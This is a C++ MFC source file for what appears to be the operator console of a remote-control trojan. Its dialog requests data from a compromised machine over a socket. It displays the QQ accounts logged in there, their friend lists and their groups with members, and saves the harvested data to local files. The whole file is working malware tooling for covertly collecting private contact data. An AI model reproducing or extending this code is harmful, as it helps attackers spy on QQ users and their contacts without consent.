// QQInfoDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "QQInfoDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CQQInfoDlg dialog


CQQInfoDlg::CQQInfoDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CQQInfoDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CQQInfoDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
// 	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_QQ));
	m_pQQLocalJson	= NULL;
}


void CQQInfoDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CQQInfoDlg)
	DDX_Control(pDX, IDC_TREE_GROUP, m_treegroup);
	DDX_Control(pDX, IDC_TREE_FRIEND, m_treefriend);
	DDX_Control(pDX, IDC_LIST_USER, m_listuser);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CQQInfoDlg, CDialog)
	//{{AFX_MSG_MAP(CQQInfoDlg)
	ON_BN_CLICKED(IDC_STC_USER, OnBtnUser)
	ON_BN_CLICKED(IDC_STC_FRIEND, OnBtnFriend)
	ON_BN_CLICKED(IDC_STC_GROUP, OnBtnGroup)
	ON_LBN_DBLCLK(IDC_LIST_USER, OnDblclkListUser)
	ON_WM_CLOSE()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CQQInfoDlg message handlers

BOOL CQQInfoDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - 好友信息", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);
	SetDlgItemText(IDC_STC_USER, "正在获取，请稍候...");
	
	// 通知远程控制端对话框已经打开
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
	
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CQQInfoDlg::OnReceiveComplete()
{
	char *szQQLocalJson;

	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_QQDATA:
		szQQLocalJson = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
		if (m_pQQLocalJson != NULL)
		{
			cJSON_Delete(m_pQQLocalJson);
			m_pQQLocalJson = NULL;
		}
		m_pQQLocalJson = cJSON_Parse(szQQLocalJson);
		if (m_pQQLocalJson != NULL)
		{
			cJSON *user; cJSON *nickname; cJSON *uin; CString strUser;
			for (user = m_pQQLocalJson->child; user; user = user->next)
			{
				nickname = cJSON_GetObjectItem(user, "nickname");
				uin = cJSON_GetObjectItem(user, "uin");
				if (nickname == NULL || uin == NULL)
					continue;
				strUser.Format("%s(%s)", nickname->valuestring, uin->valuestring);
				m_listuser.AddString(strUser);
			}
		}
		SetDlgItemText(IDC_STC_USER, "->查看已登录QQ信息<-");
		GetDlgItem(IDC_STC_USER)->EnableWindow(TRUE);
		GetDlgItem(IDC_STC_FRIEND)->EnableWindow(TRUE);
		GetDlgItem(IDC_STC_GROUP)->EnableWindow(TRUE);
		break;
	default:
		// 传输发生异常数据
		break;
	}
}

void CQQInfoDlg::OnBtnUser() 
{
	// TODO: Add your control notification handler code here
	SetDlgItemText(IDC_STC_USER, "正在获取，请稍候...");
	SetDlgItemText(IDC_STC_FRIEND, "查看已保存QQ信息");
	GetDlgItem(IDC_STC_USER)->EnableWindow(FALSE);
	GetDlgItem(IDC_STC_FRIEND)->EnableWindow(FALSE);
	GetDlgItem(IDC_STC_GROUP)->EnableWindow(FALSE);
	m_listuser.ResetContent();
	m_treefriend.DeleteAllItems();
	m_treegroup.DeleteAllItems();
	BYTE bToken = COMMAND_QQDATA;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CQQInfoDlg::OnBtnFriend() 
{
	// TODO: Add your control notification handler code here
	CString strFind;
	CString strUser;
	CFileFind finder;
	CFile file;
	char *szBuffer;
	cJSON *user;
	cJSON *nickname;
	cJSON *uin;

	SetDlgItemText(IDC_STC_USER, "查看已登录QQ信息");
	SetDlgItemText(IDC_STC_FRIEND, "正在获取，请稍候...");
	GetDlgItem(IDC_STC_USER)->EnableWindow(FALSE);
	GetDlgItem(IDC_STC_FRIEND)->EnableWindow(FALSE);
	GetDlgItem(IDC_STC_GROUP)->EnableWindow(FALSE);
	m_listuser.ResetContent();
	m_treefriend.DeleteAllItems();
	m_treegroup.DeleteAllItems();
	if (m_pQQLocalJson != NULL)
	{
		cJSON_Delete(m_pQQLocalJson);
		m_pQQLocalJson = NULL;
	}

	m_pQQLocalJson = cJSON_CreateArray();
	strFind.Format("%s\\Tools\\%s\\*.txt", ((CClientApp *)AfxGetApp())->AppPath, "好友信息");
	BOOL bFind = finder.FindFile(strFind);
	while (bFind)
	{
		bFind = finder.FindNextFile();
		if (!file.Open(finder.GetFilePath(), CFile::modeRead))
			continue;
		szBuffer = new char[finder.GetLength() + 1];
		memset(szBuffer, 0, finder.GetLength() + 1);
		file.Read(szBuffer, finder.GetLength());
		file.Close();
		user = cJSON_Parse(szBuffer);
		delete[] szBuffer;
		if (user != NULL)
		{
			cJSON_AddItemToArray(m_pQQLocalJson, user);
			nickname = cJSON_GetObjectItem(user, "nickname");
			uin = cJSON_GetObjectItem(user, "uin");
			if (nickname == NULL || uin == NULL)
				continue;
			strUser.Format("%s(%s)", nickname->valuestring, uin->valuestring);
			m_listuser.AddString(strUser);
		}
	}
	finder.Close();

	SetDlgItemText(IDC_STC_FRIEND, "->查看已保存QQ信息<-");
	GetDlgItem(IDC_STC_USER)->EnableWindow(TRUE);
	GetDlgItem(IDC_STC_FRIEND)->EnableWindow(TRUE);
}

void CQQInfoDlg::OnBtnGroup() 
{
	// TODO: Add your control notification handler code here
	cJSON *user;
	cJSON *nickname;
	cJSON *uin;
	cJSON *pQQFriendJson;
	cJSON *pQQGroupJson;
	CString strFileName;
	CFile file;
	char *szBuffer;
	if (m_listuser.GetCount() <= 0)
		return;
	if (m_pQQLocalJson == NULL)
		return;


	strFileName.Format("%s\\Tools\\%s", ((CClientApp *)AfxGetApp())->AppPath, "好友信息");
	CreateDirectory(strFileName, NULL);
	for (user = m_pQQLocalJson->child; user; user = user->next)
	{
		nickname = cJSON_GetObjectItem(user, "nickname");
		uin = cJSON_GetObjectItem(user, "uin");
		if (nickname == NULL || uin == NULL)
			continue;
		pQQFriendJson = cJSON_GetObjectItem(user, "friends");
		pQQGroupJson = cJSON_GetObjectItem(user, "groups");
		if (pQQFriendJson == NULL && pQQGroupJson == NULL)
			continue;
		strFileName.Format("%s\\Tools\\%s\\%s.txt", ((CClientApp *)AfxGetApp())->AppPath, "好友信息", uin->valuestring);
		if (!file.Open(strFileName, CFile::modeCreate|CFile::modeWrite))
			continue;
		szBuffer = cJSON_PrintUnformatted(user);
		file.Write(szBuffer, strlen(szBuffer));
		free(szBuffer);
		file.Close();
	}
	MessageBox("该机已登录QQ信息保存完成", "信息", MB_ICONINFORMATION);
}

void CQQInfoDlg::OnDblclkListUser() 
{
	// TODO: Add your control notification handler code here
	int iCurSel = m_listuser.GetCurSel();
	if (iCurSel != LB_ERR)
	{
		CString strText, strQQNumber;
		m_listuser.GetText(iCurSel, strText);
		int iLPos = strText.Find("(");
		int iRPos = strText.ReverseFind(')');
		strQQNumber = strText.Mid(iLPos + 1, iRPos - iLPos - 1);
		m_treefriend.DeleteAllItems();
		m_treegroup.DeleteAllItems();
		AddTreeFriendByNumber(strQQNumber);
		AddTreeGroupByNumber(strQQNumber);
	}
}

void CQQInfoDlg::AddTreeFriendByNumber(CString strQQNumber)
{
	cJSON *user;
	cJSON *uin;
	cJSON *pQQFriendJson;
	cJSON *ec;
	cJSON *result;

	if (m_pQQLocalJson == NULL)
		return;
	for (user = m_pQQLocalJson->child; user; user = user->next)
	{
		uin = cJSON_GetObjectItem(user, "uin");
		pQQFriendJson = cJSON_GetObjectItem(user, "friends");
		if (uin == NULL || pQQFriendJson == NULL)
			continue;
		if (strcmp(uin->valuestring, strQQNumber) == 0)
		{
			ec = cJSON_GetObjectItem(pQQFriendJson, "ec");
			if (ec == NULL)
				continue;
			if (ec->valueint != 0)
				continue;
			result = cJSON_GetObjectItem(pQQFriendJson, "result");
			if (result == NULL)
				continue;
			for (result = result->child; result; result = result->next)
			{
				char *szQQGroupName = NULL;
				cJSON *gname = cJSON_GetObjectItem(result, "gname");
				if (gname)
					szQQGroupName = gname->valuestring;
				else
					szQQGroupName = "我的好友";
				HTREEITEM hTreeItem = m_treefriend.InsertItem(szQQGroupName, TVI_ROOT);
				cJSON *mems = cJSON_GetObjectItem(result, "mems");
				if (mems == NULL) continue;
				for (mems = mems->child; mems; mems = mems->next)
				{
					CString strItemText; char *szQQName; int uQQNumber;
					szQQName = cJSON_GetObjectItem(mems, "name")->valuestring;
					uQQNumber = cJSON_GetObjectItem(mems, "uin")->valueint;
					strItemText.Format("%s(%u)", szQQName, uQQNumber);
					m_treefriend.InsertItem(strItemText, hTreeItem);
				}
			}
			break;
		}
	}
}

void CQQInfoDlg::AddTreeGroupByNumber(CString strQQNumber)
{
	cJSON *user;
	cJSON *uin;
	cJSON *pQQGroupJson;
	cJSON *ec;
	cJSON *create;
	cJSON *join;
	cJSON *gn;
	cJSON *gc;
	cJSON *gmr;

	if (m_pQQLocalJson == NULL)
		return;
	for (user = m_pQQLocalJson->child; user; user = user->next)
	{
		uin = cJSON_GetObjectItem(user, "uin");
		pQQGroupJson = cJSON_GetObjectItem(user, "groups");
		if (uin == NULL || pQQGroupJson == NULL)
			continue;
		if (strcmp(uin->valuestring, strQQNumber) == 0)
		{
			ec = cJSON_GetObjectItem(pQQGroupJson, "ec");
			if (ec == NULL)
				continue;
			if (ec->valueint != 0)
				continue;
			create = cJSON_GetObjectItem(pQQGroupJson, "create");
			join = cJSON_GetObjectItem(pQQGroupJson, "join");
			if (create == NULL && join == NULL)
				continue;
			if (create != NULL)
			{
				for (create = create->child; create; create = create->next)
				{
					CString strQQGroupName;
					gn = cJSON_GetObjectItem(create, "gn");
					gc = cJSON_GetObjectItem(create, "gc");
					if (gn == NULL || gc == NULL)
						continue;
					strQQGroupName.Format("%s(%u)", gn->valuestring, gc->valueint);
					HTREEITEM hTreeItem = m_treegroup.InsertItem(strQQGroupName, TVI_ROOT);
					gmr = cJSON_GetObjectItem(create, "gmr");
					if (gmr == NULL)
						continue;
					ec = cJSON_GetObjectItem(gmr, "ec");
					if (ec == NULL)
						continue;
					if (ec->valueint != 0)
						continue;
					cJSON *mems = cJSON_GetObjectItem(gmr, "mems");
					if (mems == NULL) continue;
					for (mems = mems->child; mems; mems = mems->next)
					{
						CString strItemText; char *szQQNick; int uQQNumber;
						szQQNick = cJSON_GetObjectItem(mems, "nick")->valuestring;
						uQQNumber = cJSON_GetObjectItem(mems, "uin")->valueint;
						strItemText.Format("%s(%u)", szQQNick, uQQNumber);
						m_treegroup.InsertItem(strItemText, hTreeItem);
					}
				}
			}
			if (join != NULL)
			{
				for (join = join->child; join; join = join->next)
				{
					CString strQQGroupName;
					gn = cJSON_GetObjectItem(join, "gn");
					gc = cJSON_GetObjectItem(join, "gc");
					if (gn == NULL || gc == NULL)
						continue;
					strQQGroupName.Format("%s(%u)", gn->valuestring, gc->valueint);
					HTREEITEM hTreeItem = m_treegroup.InsertItem(strQQGroupName, TVI_ROOT);
					gmr = cJSON_GetObjectItem(join, "gmr");
					if (gmr == NULL)
						continue;
					ec = cJSON_GetObjectItem(gmr, "ec");
					if (ec == NULL)
						continue;
					if (ec->valueint != 0)
						continue;
					cJSON *mems = cJSON_GetObjectItem(gmr, "mems");
					if (mems == NULL) continue;
					for (mems = mems->child; mems; mems = mems->next)
					{
						CString strItemText; char *szQQNick; int uQQNumber;
						szQQNick = cJSON_GetObjectItem(mems, "nick")->valuestring;
						uQQNumber = cJSON_GetObjectItem(mems, "uin")->valueint;
						strItemText.Format("%s(%u)", szQQNick, uQQNumber);
						m_treegroup.InsertItem(strItemText, hTreeItem);
					}
				}
			}
			break;
		}
	}
}

void CQQInfoDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);	
	DestroyWindow();
}

void CQQInfoDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	delete this;
	CDialog::PostNcDestroy();
}
